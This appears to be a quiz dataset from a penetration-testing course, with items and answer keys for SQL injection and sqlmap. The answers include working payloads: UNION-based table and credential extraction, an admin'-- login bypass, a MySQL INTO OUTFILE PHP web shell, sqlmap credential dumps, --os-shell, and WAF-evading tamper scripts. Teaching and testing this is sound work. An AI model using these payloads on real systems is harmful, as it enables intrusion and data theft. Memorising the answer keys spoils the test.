# Module 16 – SQL Injection
{"module_id":16,"type":"fill_command","difficulty":"medium","prompt":"Write the SQL UNION payload to enumerate all table names in the current database, assuming 3 columns with output in column 2:","options":None,"answer":"UNION SELECT 1,group_concat(table_name separator ', '),3 FROM information_schema.tables WHERE table_schema=database() --","explanation":"group_concat concatenates all table names into a single string. information_schema.tables contains metadata for all tables. table_schema=database() filters to only the current database's tables.","validation_regex":"UNION SELECT.*group_concat.*table_name.*information_schema\\.tables.*database\\(\\)|UNION.*information_schema.*tables","hints":["Use information_schema.tables","group_concat combines multiple rows into one string"]},
{"module_id":16,"type":"fill_command","difficulty":"easy","prompt":"Write the SQL injection technique to determine the number of columns in a SELECT query using ORDER BY, starting from 1:","options":None,"answer":"ORDER BY 1 --\nORDER BY 2 --\nORDER BY 3 --\n(continue until error — N-1 columns is the count when ORDER BY N causes an error)","explanation":"ORDER BY N sorts by column N. When N exceeds the column count, the database returns an error. Increment from 1 until the error appears — N-1 is the column count. More reliable than UNION SELECT for column counting.","validation_regex":"ORDER BY [0-9]+ --","hints":["Increment until you get an error","Error on ORDER BY N means N-1 columns"]},
{"module_id":16,"type":"multiple_choice","difficulty":"hard","prompt":"A web app parameter is injectable but returns no visible output and no response difference for true/false conditions. What technique do you use?","options":["It's not injectable","Use UNION-based injection","Use time-based blind SQL injection (SLEEP/WAITFOR)","Use error-based injection"],"answer":"Use time-based blind SQL injection (SLEEP/WAITFOR)","explanation":"When there's no output and no boolean response difference, time-based injection is the fallback. SLEEP(5) delays the response by 5 seconds if injected successfully — confirming injection regardless of response content.","validation_regex":None,"hints":["No output + no boolean = need a time side channel","SLEEP delay confirms execution without visible output"]},
{"module_id":16,"type":"fill_command","difficulty":"hard","prompt":"Write the MySQL SQL injection payload to write a PHP web shell to /var/www/html/shell.php using INTO OUTFILE, assuming 3 columns UNION injection:","options":None,"answer":"UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' --","explanation":"INTO OUTFILE writes query results to a file. The PHP shell goes in column 2. Requires: FILE privilege, secure_file_priv='' (or path matching), and write permission to the web root. Access: http://target.com/shell.php?cmd=id","validation_regex":"UNION SELECT.*INTO OUTFILE.*shell\\.php|INTO OUTFILE.*var/www","hints":["INTO OUTFILE goes after the SELECT columns","Requires FILE privilege and write access to web root"]},
{"module_id":16,"type":"case_file","difficulty":"medium","prompt":"Entering admin'-- in a login form's username field logs you in as admin without a password. Explain why and extract the user table.","options":None,"answer":"The application query is likely: SELECT * FROM users WHERE username='INPUT' AND password='INPUT2'\nWith admin'-- injected: SELECT * FROM users WHERE username='admin'-- AND password=''\nThe -- comments out the password check, so only username is evaluated. Since 'admin' exists, login succeeds.\n\nTo extract users table:\n1. Find column count: admin' ORDER BY 1-- (increase until error)\n2. Find printable columns: admin' UNION SELECT 1,2,3--\n3. Extract: admin' UNION SELECT 1,group_concat(username,':',password),3 FROM users--","explanation":"Authentication bypass via SQLi works by commenting out the password condition. The attacker only needs a valid username — the password can be anything.","validation_regex":"(?i)comment|--.*AND|UNION SELECT.*users|group_concat.*password","hints":["What does -- do to the rest of the query?","How does UNION extend the original query?"]},

# Module 17 – SQLMap
{"module_id":17,"type":"fill_command","difficulty":"medium","prompt":"Write the sqlmap command to test a POST request saved in request.txt, targeting the 'id' parameter, using level 3, specifying MySQL as DBMS, running non-interactively:","options":None,"answer":"sqlmap -r request.txt -p id --dbms=mysql --level=3 --batch","explanation":"-r request.txt feeds the full HTTP request. -p id targets only the id parameter. --dbms=mysql skips testing other DB types. --level=3 increases test depth. --batch answers all prompts automatically.","validation_regex":"sqlmap -r request\\.txt.*-p id.*--dbms=mysql.*--level=3.*--batch|sqlmap.*request\\.txt.*mysql.*level.*batch","hints":["-p specifies the parameter to test","--batch enables non-interactive mode"]},
{"module_id":17,"type":"fill_command","difficulty":"medium","prompt":"After sqlmap confirms injection, write the command to dump 'username' and 'password' columns from the 'users' table in database 'webapp':","options":None,"answer":"sqlmap -r request.txt --batch -D webapp -T users -C username,password --dump","explanation":"-D specifies database, -T specifies table, -C specifies columns, --dump extracts the data. SQLMap automatically attempts to crack found password hashes using its built-in dictionary.","validation_regex":"sqlmap.*-D webapp.*-T users.*-C username,password.*--dump|sqlmap.*--dump.*webapp.*users","hints":["-D database, -T table, -C columns","--dump extracts the actual data"]},
{"module_id":17,"type":"multiple_choice","difficulty":"medium","prompt":"Which sqlmap tamper script replaces spaces with /* */ comments to bypass WAF filters?","options":["randomcase","between","space2comment","charunicodeencode"],"answer":"space2comment","explanation":"space2comment replaces spaces with /**/ which is valid SQL but bypasses WAFs looking for spaces between keywords. Example: SELECT/**/*//**/FROM/**/users. Chain with other tampers: --tamper=space2comment,randomcase.","validation_regex":None,"hints":["The name describes what it does to spaces","/**/ is a SQL comment that equals a space"]},
{"module_id":17,"type":"fill_command","difficulty":"hard","prompt":"Write the sqlmap command to attempt getting an interactive OS shell via SQL injection using request.txt:","options":None,"answer":"sqlmap -r request.txt --os-shell --batch","explanation":"--os-shell attempts to upload and execute a backdoor for interactive OS access. On MySQL: uses INTO OUTFILE to write a PHP/ASP shell. On MSSQL: uses xp_cmdshell. Requires elevated DB privileges and filesystem write access.","validation_regex":"sqlmap.*request\\.txt.*--os-shell.*--batch|sqlmap.*--os-shell","hints":["--os-shell requires FILE privilege or xp_cmdshell","It writes a backdoor to get command execution"]},
{"module_id":17,"type":"decision_tree","difficulty":"medium","prompt":"sqlmap returns '[WARNING] it seems that the website is protected by a WAF/IPS' and marks all tests as false positives. What is your next approach?","options":["Give up and try a different vulnerability","Use manual SQLi in Burp Repeater since automation is blocked","Apply tamper scripts (--tamper=space2comment,randomcase) and increase level/risk, then if needed do manual SQLi","Delete the WAF"],"answer":"Apply tamper scripts (--tamper=space2comment,randomcase) and increase level/risk, then if needed do manual SQLi","explanation":"WAF detection in sqlmap doesn't mean no SQLi exists — it means automated payloads are blocked. Tamper scripts encode payloads differently to evade signature-based WAFs. If tampers fail, manual testing in Burp Repeater with custom payloads often bypasses WAFs.","validation_regex":None,"hints":["WAF detection != no vulnerability","Tamper scripts change payload encoding"]},

